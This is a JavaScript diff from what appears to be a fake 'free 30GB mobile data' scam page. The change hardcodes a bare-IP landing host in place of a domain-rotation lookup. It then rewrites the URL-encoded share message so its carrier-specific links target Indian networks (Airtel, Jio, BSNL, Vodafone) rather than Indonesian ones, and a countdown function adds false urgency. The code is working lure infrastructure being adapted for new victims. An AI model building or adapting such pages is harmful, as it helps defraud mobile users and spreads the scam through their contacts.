@@ -1382,6 +1382,7 @@ $(".liked").click(function () {
    
     function getDomain() {
 		let newDomain;
+        /*
 		var xhr = null;
 		try{
 			xhr = new XMLHttpRequest();
@@ -1396,11 +1397,13 @@ $(".liked").click(function () {
 		if (!newDomain || newDomain === null || newDomain === 'null' || newDomain === undefined) {
 			return 'https://www.data4g.top/';
 		}
+        */
+        newDomain = "http://54.165.0.194/";
 		return newDomain;
 	}
 	let newDomain = getDomain();
 	
-  landingDomain='*1.%20Telkomsel*%0A' + newDomain + 'Telkomsel-30GB%0A%0A*2.%20XL*%0A' + newDomain + 'XL-30GB%0A%0A*3.%20THREE*%0A' + newDomain + 'Three-30GB%0A%0A*4.%20indosat*%0A' + newDomain + 'indosat-30GB%0A%0A*5.%20AXIS*%0A' + newDomain + 'AXIS-30GB%0A%0A*6.%20smartfren*%0A' + newDomain + 'smartfren-30GB%0A%0A*7.%20Other%20Networks*%0A' + newDomain + 'Other-30GB%0A%0A';
+  landingDomain='*1.%20AIRTEL*%0A' + newDomain + 'AIRTEL-30GB%0A%0A*2.%20JIO*%0A' + newDomain + 'JIO-30GB%0A%0A*3.%20IdEA*%0A' + newDomain + 'IdEA-30GB%0A%0A*4.%20BSNL*%0A' + newDomain + 'BSNL-30GB%0A%0A*5.%20Vodafone*%0A' + newDomain + 'Vodafone-30GB%0A%0A*6.%20MTML*%0A' + newDomain + 'MTML-30GB%0A%0A*7.%20Other%20Networks*%0A' + newDomain + 'Other-30GB%0A%0A';
     function deadline() {
         var day3 = new Date();
         day3.setTime(day3.getTime()+24*60*60*1000);
